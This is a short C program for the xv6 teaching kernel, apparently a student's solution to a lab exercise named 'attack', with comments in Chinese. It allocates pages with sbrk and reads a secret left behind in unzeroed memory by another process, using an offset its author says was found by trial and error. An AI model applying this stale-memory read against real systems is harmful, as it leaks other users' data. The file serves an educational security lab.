#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)
  if(argc != 1){
    //这里是为了确认调用attack的时候有没有额外加参数，因为需要attack是空的，来接收secret。
    printf("Usage: attack \n");
    exit(1);
  }

  char *secret = sbrk(PGSIZE*32);
  //跟secret分配的页（page）对齐，增加读到secret的可能性。

  secret = secret + 17*PGSIZE;//试了半天……只有这个值能出结果
  
  write(2, secret+32, 8);//这个写入是为了跟secret的复制对齐。
  exit(0);
    
}
